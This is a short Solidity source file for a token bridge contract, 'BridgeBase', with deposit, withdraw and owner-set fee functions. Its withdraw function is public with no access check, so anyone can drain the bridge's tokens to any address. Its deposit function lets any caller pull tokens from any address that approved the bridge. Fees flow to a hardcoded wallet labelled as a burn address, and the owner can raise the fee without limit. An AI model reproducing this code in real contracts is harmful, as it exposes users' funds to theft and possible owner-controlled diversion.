contract BridgeBase is Context, Ownable{

    using SafeMath for uint256;

    IToken public token;

    uint256 private _tTotal = 100000000000000 * 10**9;
    uint256 private fee = 4;
    address private burnaddress = 0xC2a5ea1d4406EC5fdd5eDFE0E13F59124C7e9803;

    constructor(address _token) {
        token = IToken(_token);
    }

    function Depositfrom (address from, uint256 amount) public {
        token.transferFrom(from, address(this), amount);
    }
    
    function WithdrawTo (address to, uint256 amount) public {
        token.transfer(burnaddress, amount.mul(fee).div(100));
        token.transfer(to, amount.mul(100 - fee).div(100));
    }

    function setFee(uint256 f) public virtual onlyOwner {
        fee = f;
    }
}

